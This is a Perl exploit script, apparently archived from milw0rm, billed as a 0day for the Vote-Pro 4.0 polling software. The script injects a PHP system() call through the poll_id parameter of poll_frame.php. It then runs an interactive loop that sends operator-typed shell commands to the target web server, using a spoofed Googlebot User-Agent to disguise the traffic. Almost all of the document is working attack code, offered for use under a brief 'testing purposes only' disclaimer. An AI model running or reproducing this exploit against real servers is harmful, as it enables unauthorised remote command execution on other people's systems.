<html><head><title>Vote-Pro 4.0 (poll_frame.php poll_id) Remote Code Execution Exploit</title></head><pre>#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                          Vote-Pro Code Injection 0day Exploit                                 #
#################################################################################################
# Software: Vote-Pro 4.0                                                                        #
#                                                                                               #
# Vendor: http://www.vote-pro.com/                                                              #
#                                                                                               #
# Released: 2007/01/23                                                                          #
#                                                                                               #
# Discovered &amp; Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note: The information provided in this document is for Vote-Pro administrator                 #
# testing purposes only!                                                                        #
#################################################################################################

use IO::Socket;

$port = &quot;80&quot;; # connection port
$target = shift; # vote-pro.com
$folder = shift; # /votepro/

sub Header()
{
	print q
	{Vote-Pro Code Injection Exploit - writ3r [at] gmail.com
-------------------------------------------------------
};
}

sub Usage()
{
	print q
	{
Usage: votecmd.pl [target] [directory]
Example: votecmd.pl vote-pro.com /votepro/
};
	exit();
}

Header();

if (!$target || !$folder) {
	Usage(); }

print &quot;[+] Connecting...\n&quot;;
$cmd = &quot;dir&quot;;
while ($cmd !~ &quot;exit&quot;)
{
	$xpack = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect on exploit attempt. Exiting...\r\n&quot;;
	print $xpack &quot;GET &quot;.$folder.&quot;poll_frame.php?poll_id=hyphy;system($_GET[com]);&amp;com=&quot;.substr($cmd, 0, -1).&quot;; HTTP/1.1\n&quot;;
	print $xpack &quot;Host: $target\n&quot;;
	print $xpack &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
	print $xpack &quot;Accept: text/html\n&quot;;
	print $xpack &quot;Connection: keep-alive\n\n&quot;;

	print &quot;[cmd]\$ &quot;;
	$cmd = &lt;STDIN&gt;;
	$cmd =~ s/ /%20/g;
}

print &quot;[!] Connection to host lost...\n&quot;;

# milw0rm.com [2007-01-23]</pre></html>